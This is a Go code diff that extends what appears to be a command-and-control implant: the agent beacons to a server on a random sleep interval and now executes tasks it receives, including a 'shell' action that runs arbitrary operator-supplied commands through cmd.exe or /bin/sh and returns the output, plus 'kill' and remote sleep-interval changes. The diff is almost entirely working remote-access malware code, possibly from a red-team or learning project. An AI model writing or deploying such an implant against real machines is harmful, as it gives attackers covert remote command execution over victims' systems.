@@ -12,6 +12,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"runtime"
 	"time"
 
@@ -25,6 +26,8 @@ var hostname string
 var agentOS string
 var agentArch string
 var generator *rand.Rand
+var sleepMinSec = 30
+var sleepMaxSec = 100
 
 func initClient() {
 	// set up config for client creation
@@ -142,6 +145,7 @@ func beacon() error {
 		// execute commands
 		for _, command := range responsePayload.Commands {
 			log.Printf("TASK RECEIVED: ID %s, Action: %s, Args: %s", command.TaskID, command.Action, command.Arguments)
+			executeCommand(command)
 		}
 		return nil
 	case http.StatusNoContent:
@@ -155,6 +159,45 @@ func beacon() error {
 	}
 }
 
+func executeCommand(cmd proto.Command) string {
+	switch cmd.Action {
+	case "kill":
+		os.Exit(0)
+		return "killing agent..." // return statement to satisfy compiler
+	case "sleep":
+		var sleepMin int = 0
+		var sleepMax int = 0
+
+		_, err := fmt.Sscanf(cmd.Arguments, "%d %d", &sleepMin, &sleepMax)
+		if err != nil {
+			log.Printf("Failed to update agent sleep interval: %v", err)
+			return fmt.Sprintf("Failed to update agent sleep interval: %v", err)
+		}
+		sleepMinSec = sleepMin
+		sleepMaxSec = sleepMax
+		return fmt.Sprintf("Sleep interval updated to %d-%d seconds", sleepMin, sleepMax)
+	case "shell":
+		var output []byte
+		var err error
+		if agentOS == "windows" {
+			output, err = exec.Command("cmd.exe", "/C", cmd.Arguments).CombinedOutput()
+		} else {
+			output, err = exec.Command("/bin/sh", "-c", cmd.Arguments).CombinedOutput()
+		}
+
+		result := string(output)
+		if err != nil {
+			if len(result) > 0 {
+				result += "\n"
+			}
+			result += fmt.Sprintf("[ERROR] Execution failed: %v", err)
+		}
+		return result
+	default:
+		return fmt.Sprintf("Unknown command: %s", cmd.Action)
+	}
+}
+
 func main() {
 	// initialization functions
 	initRand()
@@ -163,13 +206,9 @@ func main() {
 		log.Fatalf("Failed to register agent: %v", err)
 	}
 
-	// beacon sleep range in seconds
-	minSec := 30
-	maxSec := 100
-
 	for {
 		// sleep random amount of time
-		timeToSleep := generator.Intn(maxSec-minSec) + 30
+		timeToSleep := generator.Intn(sleepMaxSec-sleepMinSec) + 30
 		time.Sleep(time.Duration(timeToSleep) * time.Second)
 
 		// beacon callout
